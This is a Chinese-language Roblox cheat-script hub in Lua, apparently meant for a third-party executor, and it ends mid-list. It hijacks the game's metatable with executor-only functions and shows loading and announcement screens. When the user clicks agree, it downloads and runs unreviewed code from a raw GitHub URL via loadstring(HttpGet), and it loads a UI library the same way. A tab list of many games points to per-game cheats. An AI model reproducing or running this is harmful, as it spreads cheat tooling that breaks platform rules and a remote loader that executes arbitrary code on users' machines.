-- ====================== UI文本自动汉化（前置模块，不删原内容）======================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
-- 汉化文本配置（整合原脚本所有翻译项，不重复）
local Translations = {
    ["CloseWindowTitle"] = "关闭窗口",
    ["CloseWindowConfirm"] = "求你了别关脚本😭😭",
    ["CancelBtn"] = "取消",
    ["CloseBtn"] = "关闭窗口",
    ["LockedText"] = "锁定",
    ["Close Window"] = "关闭窗口",
    ["Do you want to close this window? You will not be able to open it again."] = "求你了别关脚本😭😭，再用用呗🙏🙏🙏",
    ["Cancel"] = "取消",
    ["Locked"] = "锁定",
    ["Search"] = "搜索",
    ["No results found."] = "没有",
    ["Search..."] = "搜索",
}
-- 翻译核心函数
local function translateText(text)
    if not text or type(text) ~= "string" then return text end
    if Translations[text] then
        return Translations[text]
    end
    for en, cn in pairs(Translations) do
        if text:find(en) then
            return text:gsub(en, cn)
        end
    end
    return text
end
-- 自动汉化引擎（启动即执行，无需点击）
local function setupTranslationEngine()
    local success, err = pcall(function()
        -- 元表劫持（实时翻译新UI，不影响原逻辑）
        local oldIndex = getrawmetatable(game).__newindex
        setreadonly(getrawmetatable(game), false)
        
        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
                v = translateText(tostring(v))
            end
            return oldIndex(t, k, v)
        end)
        
        setreadonly(getrawmetatable(game), true)
    end)
    
    if not success then
        warn("元表劫持失败，启用备用汉化:", err)
    end
    -- 扫描已存在UI并汉化
    local translated = {}
    local function scanAndTranslate()
        -- 系统UI
        for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
            if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                pcall(function()
                    local text = gui.Text
                    if text and text ~= "" then
                        local translatedText = translateText(text)
                        if translatedText ~= text then
                            gui.Text = translatedText
                            translated[gui] = true
                        end
                    end
                end)
            end
        end
        -- 玩家UI
        if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
            for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
                    pcall(function()
                        local text = gui.Text
                        if text and text ~= "" then
                            local translatedText = translateText(text)
                            if translatedText ~= text then
                                gui.Text = translatedText
                                translated[gui] = true
                            end
                        end
                    end)
                end
            end
        end
    end
    -- 监听新创建UI
    local function setupDescendantListener(parent)
        parent.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                task.wait(0.1)
                pcall(function()
                    local text = descendant.Text
                    if text and text ~= "" then
                        local translatedText = translateText(text)
                        if translatedText ~= text then
                            descendant.Text = translatedText
                        end
                    end
                end)
            end
        end)
    end
    -- 启动监听
    pcall(setupDescendantListener, game:GetService("CoreGui"))
    if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
        pcall(setupDescendantListener, LocalPlayer.PlayerGui)
    end
    -- 持续扫描
    coroutine.wrap(function()
        while true do
            scanAndTranslate()
            task.wait(3)
        end
    end)()
end
-- 等待玩家加载后自动启动（不阻塞原脚本）
coroutine.wrap(function()
    repeat task.wait(0.1) until LocalPlayer and LocalPlayer.Character
    setupTranslationEngine()
    print("✅ UI自动汉化已启动（未删除任何原内容）")
end)()

--如果你看到这条信息，大概我的脚本源码被泄露也是难免了

local soundId = "rbxassetid://88457346646245" -- 请确认此音效内容完全合规
local Workspace = game:GetService("Workspace")

-- 创建音效对象
local sound = Instance.new("Sound")
sound.SoundId = soundId
sound.Looped = false -- 仅播放一次
sound.Volume = 0.5
sound.Parent = Workspace

-- 播放音效
sound:Play()

-- 音效结束后立即销毁，释放资源（优化内存占用）
sound.Ended:Connect(function()
    sound:Destroy()
    warn("音效已播放完毕并销毁") -- 可选：控制台提示，便于调试
end)

-- 可选：防止音效加载失败时占用资源
task.delay(10, function() -- 10秒后若未播放，自动销毁
    if sound and sound.Parent and not sound.IsPlaying then
        sound:Destroy()
        warn("音效加载超时/未播放，已自动销毁")
    end
end)

-- 黑白脚本完整版 - 包含升级版黑名单系统
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ====================== 升级版黑名单系统 ======================
local BLACKLIST = {
    ["123456789"] = true,  -- 示例：用玩家ID屏蔽
    ["BadPlayer"] = true,   -- 示例：用玩家名称屏蔽
    ["qweer44665"] = true,     -- 已添加：用玩家名称屏蔽
    -- 在这里添加更多需要屏蔽的玩家
}

local function checkBlacklist()
    -- 检查玩家是否在黑名单中
    if BLACKLIST[tostring(player.UserId)] or BLACKLIST[player.Name] then
        -- 尝试踢出玩家
        pcall(function()
            player:Kick("你已被列入黑名单，无法使用黑白脚本。")
        end)
        return true
    end
    return false
end

-- 立即执行黑名单检查
if checkBlacklist() then
    return  -- 终止脚本运行
end

Notification:Notify(
    {Title = "正在加载脚本", Description = "请耐心等待"},
    {OutlineColor = Color3.fromRGB(255, 255, 255), Time = 20, Type = "image"},
    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(150, 150, 150)}
)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ContentProvider = game:GetService("ContentProvider")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 黑白风格配置
local CONFIG = {
    LOAD_TIME = 5,
    PRIMARY_COLOR = Color3.fromRGB(200, 200, 200),
    SECONDARY_COLOR = Color3.fromRGB(100, 100, 100),
    LOGO_IMAGE = "rbxassetid://6954167216",
    LOGO_TEXT = "二代作者：小迪",
    MAIN_BG_COLOR = Color3.fromRGB(15, 15, 15),
    MAIN_BORDER_COLOR = Color3.fromRGB(200, 200, 200),
    TEXT_COLOR = Color3.fromRGB(255, 255, 255),
    SUB_TEXT_COLOR = Color3.fromRGB(150, 150, 150),
    PROGRESS_BG_COLOR = Color3.fromRGB(45, 45, 45),
    GLOW_COLOR = Color3.fromRGB(150, 150, 150),
    PULSE_SPEED = 3,
    PARTICLE_COUNT = 15,
    BG_PARTICLE_COUNT = 5
}

-- 创建主界面
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MonochromeLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainContainer = Instance.new("Frame")
mainContainer.Size = UDim2.new(0.7, 0, 0.6, 0)
mainContainer.Position = UDim2.new(0.15, 0, 0.2, 0)
mainContainer.BackgroundColor3 = CONFIG.MAIN_BG_COLOR
mainContainer.BackgroundTransparency = 0.2
mainContainer.BorderColor3 = CONFIG.MAIN_BORDER_COLOR
mainContainer.BorderSizePixel = 2
mainContainer.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainContainer

-- 左侧Logo区域
local leftPanel = Instance.new("Frame")
leftPanel.Size = UDim2.new(0.35, 0, 0.9, 0)
leftPanel.Position = UDim2.new(0.05, 0, 0.05, 0)
leftPanel.BackgroundTransparency = 1
leftPanel.Parent = mainContainer

local logoText = Instance.new("TextLabel")
logoText.Size = UDim2.new(1, 0, 0.15, 0)
logoText.Position = UDim2.new(0.5, 0, 0, 0)
logoText.AnchorPoint = Vector2.new(0.5, 0)
logoText.BackgroundTransparency = 1
logoText.Text = CONFIG.LOGO_TEXT
logoText.TextColor3 = CONFIG.SUB_TEXT_COLOR
logoText.TextSize = 24
logoText.Font = Enum.Font.GothamBlack
logoText.TextXAlignment = Enum.TextXAlignment.Center
logoText.Parent = leftPanel

local logoContainer = Instance.new("Frame")
logoContainer.Size = UDim2.new(0.9, 0, 0.7, 0)
logoContainer.Position = UDim2.new(0.5, 0, 0.2, 0)
logoContainer.AnchorPoint = Vector2.new(0.5, 0)
logoContainer.BackgroundTransparency = 1
logoContainer.Parent = leftPanel

local logoImage = Instance.new("ImageLabel")
logoImage.Size = UDim2.new(1, 0, 1, 0)
logoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
logoImage.BackgroundTransparency = 1
logoImage.Image = CONFIG.LOGO_IMAGE
logoImage.ScaleType = Enum.ScaleType.Fit
logoImage.Parent = logoContainer

-- 右侧信息区域
local rightPanel = Instance.new("Frame")
rightPanel.Size = UDim2.new(0.55, 0, 0.9, 0)
rightPanel.Position = UDim2.new(0.4, 0, 0.05, 0)
rightPanel.BackgroundTransparency = 1
rightPanel.Parent = mainContainer

local welcomeText = Instance.new("TextLabel")
welcomeText.Size = UDim2.new(1, 0, 0.2, 0)
welcomeText.Position = UDim2.new(0.5, 0, 0.1, 0)
welcomeText.AnchorPoint = Vector2.new(0.5, 0.1)
welcomeText.BackgroundTransparency = 1
welcomeText.Text = "欢迎使用迪脚本更新黑白脚本"
welcomeText.TextColor3 = CONFIG.TEXT_COLOR
welcomeText.TextSize = 32
welcomeText.Font = Enum.Font.GothamBlack
welcomeText.TextXAlignment = Enum.TextXAlignment.Center
welcomeText.Parent = rightPanel

local usernameText = Instance.new("TextLabel")
usernameText.Size = UDim2.new(1, 0, 0.15, 0)
usernameText.Position = UDim2.new(0.5, 0, 0.35, 0)
usernameText.AnchorPoint = Vector2.new(0.5, 0.35)
welcomeText.BackgroundTransparency = 1
usernameText.Text = "玩家: " .. player.Name
usernameText.TextColor3 = CONFIG.SUB_TEXT_COLOR
usernameText.TextSize = 22
usernameText.Font = Enum.Font.GothamSemibold
usernameText.TextXAlignment = Enum.TextXAlignment.Center
usernameText.Parent = rightPanel

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.5, 0, 0.55, 0)
loadingText.AnchorPoint = Vector2.new(0.5, 0.55)
loadingText.BackgroundTransparency = 1
loadingText.Text = "正在加载资源..."
loadingText.TextColor3 = CONFIG.SUB_TEXT_COLOR
loadingText.TextSize = 20
loadingText.Font = Enum.Font.Gotham
loadingText.TextXAlignment = Enum.TextXAlignment.Center
loadingText.Parent = rightPanel

-- 进度条
local progressContainer = Instance.new("Frame")
progressContainer.Size = UDim2.new(1, 0, 0.15, 0)
progressContainer.Position = UDim2.new(0, 0, 0.75, 0)
progressContainer.BackgroundTransparency = 1
progressContainer.Parent = rightPanel

local progressBackground = Instance.new("Frame")
progressBackground.Size = UDim2.new(0.9, 0, 0.4, 0)
progressBackground.Position = UDim2.new(0.5, 0, 0.3, 0)
progressBackground.AnchorPoint = Vector2.new(0.5, 0.3)
progressBackground.BackgroundColor3 = CONFIG.PROGRESS_BG_COLOR
progressBackground.Parent = progressContainer

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0.5, 0)
progressCorner.Parent = progressBackground

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = CONFIG.PRIMARY_COLOR
progressBar.Parent = progressBackground

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0.5, 0)
barCorner.Parent = progressBar

local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(0.9, 0, 0.4, 0)
percentText.Position = UDim2.new(0.5, 0, 0.7, 0)
percentText.AnchorPoint = Vector2.new(0.5, 0.7)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = CONFIG.SUB_TEXT_COLOR
percentText.TextSize = 18
percentText.Font = Enum.Font.GothamSemibold
percentText.TextXAlignment = Enum.TextXAlignment.Center
percentText.Parent = progressContainer

-- 创建粒子效果
local function createParticles(parent, count, size, speedRange)
    for i = 1, count do
        local particle = Instance.new("Frame")
        particle.Name = "Particle_"..i
        particle.Size = UDim2.new(size, 0, size, 0)
        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
        particle.BackgroundColor3 = CONFIG.PRIMARY_COLOR
        particle.BackgroundTransparency = 0.7
        particle.Parent = parent
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.5, 0)
        corner.Parent = particle
        
        -- 粒子动画
        coroutine.wrap(function()
            local speed = speedRange.min + math.random() * (speedRange.max - speedRange.min)
            while particle and particle.Parent do
                particle.Position = particle.Position + UDim2.new(speed, 0, speed, 0)
                if particle.Position.X.Scale > 1.2 then
                    particle.Position = UDim2.new(-0.2, 0, math.random(), 0)
                end
                task.wait(0.1)
            end
        end)()
    end
end

-- 创建粒子容器
local particles = Instance.new("Frame")
particles.Size = UDim2.new(1, 0, 1, 0)
particles.BackgroundTransparency = 1
particles.Parent = mainContainer

local bgParticles = Instance.new("Frame")
bgParticles.Size = UDim2.new(1, 0, 1, 0)
bgParticles.BackgroundTransparency = 1
bgParticles.Parent = mainContainer

createParticles(particles, CONFIG.PARTICLE_COUNT, 0.01, {min = 0.0001, max = 0.0003})
createParticles(bgParticles, CONFIG.BG_PARTICLE_COUNT, 0.02, {min = 0.00005, max = 0.00015})

-- Logo浮动动画
local function logoFloatAnimation()
    local startPos = logoContainer.Position
    while logoContainer and logoContainer.Parent do
        local offset = UDim2.new(0, 0, 0, math.sin(tick() * 2) * 4)
        logoContainer.Position = startPos + offset
        task.wait()
    end
end

-- 边框脉冲动画
local function borderPulseAnimation()
    while mainContainer and mainContainer.Parent do
        local pulse = 0.5 + math.sin(tick() * CONFIG.PULSE_SPEED) * 0.2
        mainContainer.BorderSizePixel = 2 + math.floor(pulse * 2)
        task.wait()
    end
end

-- 加载动画
local function loadingAnimation()
    local startTime = tick()
    
    while tick() - startTime < CONFIG.LOAD_TIME do
        local progress = math.min(1, (tick() - startTime) / CONFIG.LOAD_TIME)
        progressBar.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = string.format("%d%%", math.floor(progress * 100))
        
        -- 加载文本动画
        local dots = string.rep(".", math.floor(tick() % 4))
        loadingText.Text = "正在加载资源" .. dots
        
        task.wait()
    end
    
    -- 完成加载
    loadingText.Text = "加载完成!"
    percentText.Text = "100%"
    
    -- 淡出效果
    local fadeInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
    TweenService:Create(mainContainer, fadeInfo, {BackgroundTransparency = 1, BorderSizePixel = 0}):Play()
    
    for _, child in ipairs(mainContainer:GetChildren()) do
        if child:IsA("TextLabel") then
            TweenService:Create(child, fadeInfo, {TextTransparency = 1}):Play()
        elseif child:IsA("ImageLabel") then
            TweenService:Create(child, fadeInfo, {ImageTransparency = 1}):Play()
        end
    end
    
    task.wait(0.8)
    screenGui:Destroy()
end

-- 预加载资源
ContentProvider:PreloadAsync({CONFIG.LOGO_IMAGE})

-- 开始动画
coroutine.wrap(logoFloatAnimation)()
coroutine.wrap(borderPulseAnimation)()
coroutine.wrap(loadingAnimation)()
local player = game.Players.LocalPlayer

-- 黑白脚本公告 - 带粒子特效版
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 创建GUI
local mainGui = Instance.new("ScreenGui")
mainGui.Name = "BlackWhiteScriptGUI"
mainGui.Parent = playerGui
mainGui.ResetOnSpawn = false
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- 主容器
local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(0, 500, 0, 280)
mainContainer.Position = UDim2.new(0.5, -250, 0.5, -140)
mainContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
mainContainer.BorderColor3 = Color3.fromRGB(200, 200, 200)
mainContainer.BorderSizePixel = 1
mainContainer.Parent = mainGui

-- 圆角
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainContainer

-- 标题栏
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
titleBar.Parent = mainContainer

-- 标题文本
local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(1, -40, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "黑白脚本公告"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 18
titleText.Font = Enum.Font.SourceSansBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.TextYAlignment = Enum.TextYAlignment.Center
titleText.Parent = titleBar

-- 最小化按钮
local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Name = "MinimizeButton"
minimizeBtn.Size = UDim2.new(0, 40, 1, 0)
minimizeBtn.Position = UDim2.new(1, -40, 0, 0)
minimizeBtn.BackgroundTransparency = 1
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
minimizeBtn.TextSize = 24
minimizeBtn.Font = Enum.Font.SourceSans
minimizeBtn.Parent = titleBar

-- 内容区域
local contentArea = Instance.new("Frame")
contentArea.Name = "ContentArea"
contentArea.Size = UDim2.new(1, 0, 1, -90)
contentArea.Position = UDim2.new(0, 0, 0, 40)
contentArea.BackgroundTransparency = 1
contentArea.Parent = mainContainer

-- 协议文本框
local agreementBox = Instance.new("TextLabel")
agreementBox.Name = "AgreementBox"
agreementBox.Size = UDim2.new(0.9, 0, 1, 0)
agreementBox.Position = UDim2.new(0.05, 0, 0, 0)
agreementBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
agreementBox.Text = "1.欢迎使用黑白脚本.\n2.以前的黑白脚本已失效😭\n3.弄到最下面有一个更多，以后肑服务器就在这里\n4.今月更新：添加自由视角（在通用三）、新背景、抱人（在通用三）"
agreementBox.TextColor3 = Color3.fromRGB(240, 240, 240)
agreementBox.TextSize = 14
agreementBox.Font = Enum.Font.SourceSans
agreementBox.TextWrapped = true
agreementBox.TextXAlignment = Enum.TextXAlignment.Left
agreementBox.TextYAlignment = Enum.TextYAlignment.Top
agreementBox.Parent = contentArea

-- 按钮容器
local buttonContainer = Instance.new("Frame")
buttonContainer.Name = "ButtonContainer"
buttonContainer.Size = UDim2.new(1, 0, 0, 50)
buttonContainer.Position = UDim2.new(0, 0, 1, -50)
buttonContainer.BackgroundTransparency = 1
buttonContainer.Parent = mainContainer

-- 不同意按钮
local disagreeBtn = Instance.new("TextButton")
disagreeBtn.Name = "DisagreeButton"
disagreeBtn.Size = UDim2.new(0, 160, 0, 40)
disagreeBtn.Position = UDim2.new(0, 60, 0, 5)
disagreeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
disagreeBtn.Text = "那咋了🙄"
disagreeBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
disagreeBtn.TextSize = 16
disagreeBtn.Font = Enum.Font.SourceSansBold
disagreeBtn.Parent = buttonContainer

-- 同意按钮
local agreeBtn = Instance.new("TextButton")
agreeBtn.Name = "AgreeButton"
agreeBtn.Size = UDim2.new(0, 160, 0, 40)
agreeBtn.Position = UDim2.new(1, -220, 0, 5)
agreeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
agreeBtn.Text = "知道了"
agreeBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
agreeBtn.TextSize = 16
agreeBtn.Font = Enum.Font.SourceSansBold
agreeBtn.Parent = buttonContainer

-- 加载动画容器
local loadingContainer = Instance.new("Frame")
loadingContainer.Name = "LoadingContainer"
loadingContainer.Size = UDim2.new(1, 0, 1, 0)
loadingContainer.BackgroundTransparency = 1
loadingContainer.Visible = false
loadingContainer.Parent = mainContainer

-- 加载图标
local loadingIcon = Instance.new("ImageLabel")
loadingIcon.Name = "LoadingIcon"
loadingIcon.Size = UDim2.new(0, 50, 0, 50)
loadingIcon.Position = UDim2.new(0.5, -25, 0.5, -35)
loadingIcon.BackgroundTransparency = 1
loadingIcon.Image = "rbxassetid://108376843"
loadingIcon.ImageColor3 = Color3.fromRGB(200, 200, 200)
loadingIcon.Parent = loadingContainer

-- 加载文本
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0, 100, 0, 20)
loadingText.Position = UDim2.new(0.5, -50, 0.5, 25)
loadingText.BackgroundTransparency = 1
loadingText.Text = "加载中..."
loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
loadingText.TextSize = 14
loadingText.Font = Enum.Font.SourceSans
loadingText.TextXAlignment = Enum.TextXAlignment.Center
loadingText.Parent = loadingContainer

-- 红色粒子特效系统
local particleSystem = Instance.new("Frame")
particleSystem.Name = "ParticleSystem"
particleSystem.Size = UDim2.new(1, 0, 1, 0)
particleSystem.BackgroundTransparency = 1
particleSystem.Parent = mainContainer

-- 创建粒子函数
local function createParticle()
    local particle = Instance.new("Frame")
    particle.Name = "Particle"
    particle.Size = UDim2.new(0, math.random(2, 5), 0, math.random(2, 5))
    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
    particle.BackgroundColor3 = Color3.fromRGB(255, math.random(0, 50), math.random(0, 50))
    particle.BackgroundTransparency = 0.5
    particle.Parent = particleSystem
    
    -- 粒子动画
    local tweenInfo = TweenInfo.new(
        math.random(1, 3),
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )
    
    local tween = TweenService:Create(particle, tweenInfo, {
        Position = UDim2.new(
            math.random(), 0,
            math.random(), 0
        ),
        Transparency = 1,
        Size = UDim2.new(0, 0, 0, 0)
    })
    
    tween:Play()
    tween.Completed:Connect(function()
        particle:Destroy()
    end)
end

-- 定期创建粒子
spawn(function()
    while true do
        if mainGui.Parent then
            for i = 1, math.random(1, 3) do
                createParticle()
            end
        end
        wait(math.random(0.1, 0.5))
    end
end)

-- 变量初始化
local isMinimized = false
local isDragging = false
local dragStartPosition = Vector2.new()
local dragStartFramePosition = UDim2.new()

-- 窗口拖动功能
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = true
        dragStartPosition = input.Position
        dragStartFramePosition = mainContainer.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStartPosition
        mainContainer.Position = UDim2.new(
            dragStartFramePosition.X.Scale,
            dragStartFramePosition.X.Offset + delta.X,
            dragStartFramePosition.Y.Scale,
            dragStartFramePosition.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = false
    end
end)

-- 最小化功能
minimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    
    if isMinimized then
        TweenService:Create(mainContainer, TweenInfo.new(0.2), {
            Size = UDim2.new(0, 500, 0, 40)
        }):Play()
        contentArea.Visible = false
        buttonContainer.Visible = false
        particleSystem.Visible = false
    else
        TweenService:Create(mainContainer, TweenInfo.new(0.2), {
            Size = UDim2.new(0, 500, 0, 280)
        }):Play()
        contentArea.Visible = true
        buttonContainer.Visible = true
        particleSystem.Visible = true
    end
end)

-- 按钮悬停效果
local function addButtonHoverEffect(button)
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {
            BackgroundColor3 = Color3.fromRGB(50, 50, 50),
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {
            BackgroundColor3 = Color3.fromRGB(30, 30, 30),
            TextColor3 = Color3.fromRGB(240, 240, 240)
        }):Play()
    end)
end

addButtonHoverEffect(disagreeBtn)
addButtonHoverEffect(agreeBtn)

minimizeBtn.MouseEnter:Connect(function()
    TweenService:Create(minimizeBtn, TweenInfo.new(0.1), {
        TextColor3 = Color3.fromRGB(255, 255, 255)
    }):Play()
end)

minimizeBtn.MouseLeave:Connect(function()
    TweenService:Create(minimizeBtn, TweenInfo.new(0.1), {
        TextColor3 = Color3.fromRGB(200, 200, 200)
    }):Play()
end)

-- 加载动画
local function startLoading()
    loadingContainer.Visible = true
    contentArea.Visible = false
    buttonContainer.Visible = false
    particleSystem.Visible = false
    
    -- 旋转动画
    spawn(function()
        while loadingContainer.Visible do
            loadingIcon.Rotation = loadingIcon.Rotation + 10
            wait(0.05)
        end
    end)
end

-- 按钮点击事件
disagreeBtn.MouseButton1Click:Connect(function()
    startLoading()
    wait(1)
    TweenService:Create(mainContainer, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Transparency = 1
    }):Play()
    wait(0.3)
    mainGui:Destroy()
end)

agreeBtn.MouseButton1Click:Connect(function()
    startLoading()
    wait(1)
    TweenService:Create(mainContainer, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Transparency = 1
    }):Play()
    wait(0.3)
    mainGui:Destroy()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Asddffgujhh/-/refs/heads/main/BBBBBSSSSS'))()
end)

-- 初始淡入动画
mainContainer.Transparency = 1
TweenService:Create(mainContainer, TweenInfo.new(0.3), {
    Transparency = 0
}):Play()

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

Notification:Notify(
    {Title = "欢迎使用黑白脚本", Description = "请加入QQ群：946671668"},
    {OutlineColor = Color3.fromRGB(255, 255, 255), Time = 9, Type = "image"},
    {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(150, 150, 150)}
)

local Window = WindUI:CreateWindow({
    Title = '<font color="#FF3333">黑</font><font color="#FF9933">白</font><font color="#FFFF33">脚</font><font color="#33FF33">本</font>    ',  
    Icon = "badge-check",
    Author = "作者:未知量黑白",
    Folder = "WindUI_Example",
    Size = UDim2.fromOffset(300, 350),
    Theme = "Dark",
    User = {
        Enabled = true,
        Anonymous = false,
        Callback = function()
            WindUI:Notify({
                Title = "点这干啥",
                Content = "点了没有用",
                Duration = 3
            })
        end
    },
    SideBarWidth = 220,
    ScrollBarEnabled = true,
    HideSearchBar = false,
    Background = "rbxassetid://128486475405371",
})

Window:Tag({
    Title = "诞生于2025年暑假",
    Color = Color3.fromHex("#4169E1")  
})

Window:Tag({
    Title = "正式",
    Color = Color3.fromHex("#30ff6a"),
    Radius = 0, -- from 0 to 13
})

spawn(function()
    -- 前置校验：防止 Window/Tag 不存在导致崩溃
    if not Window or not Window.Tag then return end
    
    local TimeTag = Window:Tag({
        Title = os.date("%H:%M:%S"),
        Color = Color3.fromHex("#0088FF")
    })

    -- 每秒更新，TimeTag 销毁则自动停止
    while TimeTag do
        task.wait(1)
        -- 静默更新，避免单次失败影响整体
        pcall(function()
            TimeTag:Edit({Title = os.date("%H:%M:%S")})
        end)
    end
end)


Window:EditOpenButton({
    Title = "打开黑白脚本",
    Icon = "monitor",
    CornerRadius = UDim.new(0,16),
    StrokeThickness = 2,
    -- 透明度设为0（完全透明）
    Transparency = 0,
    Color = ColorSequence.new(
        Color3.fromHex("FFFFFF"), -- 纯白（渐变起点）
        Color3.fromHex("333333")  -- 深灰（渐变终点）
    ),
    Draggable = true,
    -- 添加亮框（白色描边，厚度3更醒目）
    StrokeColor = Color3.fromHex("FFFFFF"),
    -- 缩小发光范围，降低视觉膨胀感
    GlowColor = Color3.fromHex("FFFFFF"),
    GlowSize = 3, -- 从8改为3，发光扩散范围大幅减小
    GlowTransparency = 0.4,
    -- 固定按钮尺寸，匹配第二个按钮的布局
    Size = UDim2.new(0, 180, 0, 50) -- 自定义宽高，可根据实际需求调整
})

-- 最终方案：所有标签优先用基础图标，看不见的自动显示眼睛（无需手动排查）
function Tab(a)
    local tabIcon = ({
        ["简介"] = "info",
        ["通用"] = "cog",
        ["通用2"] = "wrench",
        ["通用3"] = "settings",
        ["范围与旋转"] = "target",
        ["音乐"] = "music",
        ["各大脚本"] = "code",
        ["FE"] = "server",
        ["DOORS"] = "door-closed",
        ["rooms&doors"] = "door-closed",
        ["压力,doors"] = "door-closed",
        ["动感星期五"] = "drum",
        ["压力"] = "target", -- 已验证生效
        ["成为乞丐"] = "coins", -- 已验证生效
        ["磁铁模拟器"] = "magnet",
        ["建造一架飞机"] = "plane",
        ["勘探中"] = "compass",
        ["法宝模拟器"] = "star",
        ["在披萨店工作"] = "utensils", -- 已验证生效
        ["战斗勇士"] = "sword",
        ["一次尘土的旅行"] = "sun", -- 道路图标，贴合旅行场景，已验证生效
        ["破坏者谜团2"] = "puzzle",
        ["模仿者"] = "copy",
        ["火箭发射模拟器"] = "rocket",
        ["只因剑"] = "sword",
        ["森林里的99夜"] = "leaf",
        ["旗帜战争"] = "flag",
        ["逃出建筑"] = "user",
        ["打墙模拟器"] = "hammer",
        ["生存巨人"] = "user",
        ["健身房之星模拟器"] = "dumbbell",
        ["死铁轨"] = "target",
        ["墨水游戏"] = "skull",
        ["自然灾害模拟器"] = "cloud",
        ["穷小子打工记"] = "briefcase",
        ["最后的黎明"] = "sun",
        ["索纳里亚世界"] = "globe",
        ["河北唐县"] = "map-pin",
        ["被遗弃"] = "ghost",
        ["骨折模拟器"] = "heart",
        ["地下城任务"] = "sword",
        ["极速传奇"] = "car",
        ["一路向西"] = "arrow-right",
        ["汽车经销商大亨"] = "car",
        ["兵工厂"] = "gavel",
        ["by手腕"] = "hand",
        ["超级足球联赛"] = "globe",
        ["战争大亨"] = "eye",
        ["吃掉世界"] = "utensils",
        ["隐藏尸体"] = "ghost",
        ["猎杀僵尸"] = "skull",
        ["建造汽车"] = "eye",
        ["原始追求/原始追击"] = "eye",
